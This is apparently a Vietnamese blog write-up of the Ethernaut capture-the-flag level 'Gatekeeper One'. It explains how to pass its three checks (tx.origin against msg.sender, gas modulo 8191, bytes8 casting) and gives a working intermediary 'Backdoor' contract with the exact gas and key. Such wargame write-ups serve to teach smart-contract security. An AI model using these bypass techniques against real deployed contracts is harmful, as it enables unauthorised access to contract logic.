---
layout: post
title: "The Ethernaut: 13 - Gatekeeper One"
mathjax: true
---
# 13. Gatekeeper One 　★★★★★★

**Nhiệm vụ**: vượt qua 3 cánh cổng và thay đổi địa chỉ của cửa vào

```js
pragma solidity ^0.4.18;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

## Phân tích & Solution

Ta sẽ phân tích cách vượt qua từng cửa một

### Cửa số 1

```js
modifier gateOne() {
  require(msg.sender != tx.origin);
  _;
}
```

`tx.origin` sẽ là địa chỉ nguồn nơi phát đi giao dịch, là một ai đó, `msg.sender` là địa chỉ gọi tới hàm hiện tại

Có nghĩa là, khi ta gọi trực tiếp một hàm contract thông thường thì `msg.sender` và `tx.origin` là giống nhau, còn nếu ta gọi hàm đó thông qua một contract trung gian thì `tx.origin` vẫn sẽ là ta, nhưng `msg.sender` sẽ là contract trung gian.

Vì thế ta chỉ cần dùng một contract trung gian là có thể vượt qua cửa số 1.

### Cửa số 2

```js
modifier gateTwo() {
  require(msg.gas % 8191 == 0);
  _;
}
```

Đây chính là điều kiện khó nhằn nhất của bài, ta phải có kiến thức về debug contract để vượt qua nó. Trong bài này ta sẽ sử dụng Remix IDE để thực hiện.

Ta chuẩn bị contract trung gian như sau:

```js
contract Backdoor {
    GatekeeperOne gk;

    constructor (address _target) {
        gk = GatekeeperOne(_target);
    }

    function enterGate2() public {
        gk.enter.gas(500000)(0x12345678);
    }
}
```

Compile với _target là địa chỉ instance của bạn. Nếu muốn test nhanh thì trên Remix chúng ta có thể để môi trường là `JavaScript VM` và compile lại cả `GateKeeperOne` và `Backdoor` contract.

Ta sẽ set cho hàm enterGate2 một số lượng gas đủ lớn là `500000` gas, `_key` thì tuỳ ý vì ta chưa động đến *gateThree*. Ở đây tuy transaction gần như chắc chắn sẽ fail, tuy nhiên từ đó, ta sẽ tiến hành debug và quan sát xem cho đến khi check điều kiện `require(msg.gas % 8191 == 0);` của gate 2 chúng ta đã tốn mất bao nhiêu gas, để theo đó có thể setup số lượng gas chính xác nhất

![png]({{ site.url }}/assets/images/Gascost.png)

Ta thấy rằng cho đến bước 71, tức lúc debug chỉ vào `msg.gas`, số lượng gas hiện tại là 499760 gas, step này tốn 2 gas, vậy tổng số lượng gas đã mất là `500000 - 499760 + 2 = 242`

Do đó ta chỉ cần điều chỉnh số lượng gas là `242 + 8191*100=819342` là đủ, sở dĩ nhân với 100 để đảm bảo còn đủ gas để qua tiếp gate 3 mà vẫn qua được gate 2:

```js
function enterGate2() public {
  gk.enter.gas(819342)(0x12345678);
}
```

compile và chạy lại, ta thấy vẫn lỗi, tất nhiên rồi vì đã qua gate3 đâu, tuy nhiên nếu bật debug lên thì ta thấy là đã qua gate 2 rồi. Ngon.

### Cửa số 3

```js
modifier gateThree(bytes8 _gateKey) {
  require(uint32(_gateKey) == uint16(_gateKey));
  require(uint32(_gateKey) != uint64(_gateKey));
  require(uint32(_gateKey) == uint16(tx.origin));
  _;
}
```

Mấy điều kiện khá là loằng ngoằng, haiz, đầu vào là một tham số `_gateKey` có kiểu dữ liệu là bytes8, tức 16 kí tự hexa.

Trước hết ta nhắc lại một lượt các giới hạn số nguyên trong solidity:

- uint16: 0 tới 65535 ($$2^{16} - 1$$)
- uint32: 0 tới 4294967295 ($$2^{32} - 1$$)
- uint64: 0 tới 18446744073709551615 ($$2^{64} - 1$$)

Khi ép kiểu thì nếu số đó lớn hơn giới hạn của kiểu dữ liệu, thì sẽ quay vòng trở lại từ số bé nhất.

Có nghĩa là, giả sử như ta ép kiểu uint16(x) thì kết quả ta nhận được sẽ là x%65536

OK, quay trở lại bài toán, điều kiện thứ 3:

```js
require(uint32(_gateKey) == uint16(tx.origin));
```

ở đây `tx.origin` chính là địa chỉ của mình trên metamask. Ở đây mình sử dụng địa chỉ của mình, các bạn hãy thay tương ứng với địa chỉ của các bạn.

Do việc tính toán với số lớn của javascript hơi củ chuối, nên mình dùng python để tính toán

Trước tiên ta sẽ tính `uint16(tx.origin)`

```python
>>>int('0xf32fd9e7d64a3b90ce2e5563927eff2567ebd96b', 16) % 2**16
55659
```

Vậy thì từ `require(uint32(_gateKey) == uint16(tx.origin));` ta có `_gateKey` sẽ có dạng $$2^{32}*x + 55659$$

Điều kiện đầu tiên: `require(uint32(_gateKey) == uint16(_gateKey));`. Ta thấy rằng với dạng $$2^{32}*x + 55659$$ thì điều kiện trên rõ ràng luôn đúng vì

\\[
(2^{32} \times x + 55659) ~ mod ~ 2^{32} = (2^{32} \times x + 55659) ~ mod ~ 2^{16} = 55659
\\]

nghĩa là chỉ cần một số đi quá chu kì của $$2^{32}$$ một lượng nhỏ hơn $$2^{16}$$ là ok

Điều kiện thứ 2: `require(uint32(_gateKey) != uint64(_gateKey));`. Để đạt được điều kiện này ta chỉ cần một số đi quá giới hạn của `uint32` nhưng chưa tới giới hạn của `uint64`, khi đó số đó sẽ quay trở lại rất nhỏ với `uint32` nhưng vẫn còn rất lớn với `uint64`, thật vậy

\\[
(2^{32} + 55659) ~ mod ~ 2^{64} = 4295022955
\\\
(2^{32} + 55659) ~ mod ~ 2^{32} = 55659
\\]

Vậy nên ta chọn luôn số $$2^{32} + 55659$$ và chuyển nó qua dạng `bytes8` là ok

```python
>>> 2**32 + 55659
4295022955
>>>hex(4295022955)
'0x10000d96b'
```

đổi tên enterGate2 thành `enter`, thay *key* bằng chuỗi bên trên và submit

```js
function enter() public {
  gk.enter.gas(819342)(0x10000d96b);
}
```

Kiểm tra lại xem entrant đã đổi thành địa chỉ của mình chưa ?

```js
await contract.entrant()
"0xf32fd9e7d64a3b90ce2e5563927eff2567ebd96b"
```

Submit && All done!

## Bình luận

Đây là một bài tập hết sức khó nhằn, yêu cầu rất nhiều kiến thức tổng hợp. Từ kiến thức về msg.sender, tx.origin, cho đến overflow dữ liệu, đồng thời phải biết cả debug transaction, hiểu về khái niệm *gas* trong giao dịch. Thực sự mình đánh giá đây là bài tập khó nhất của chuỗi CTF này.
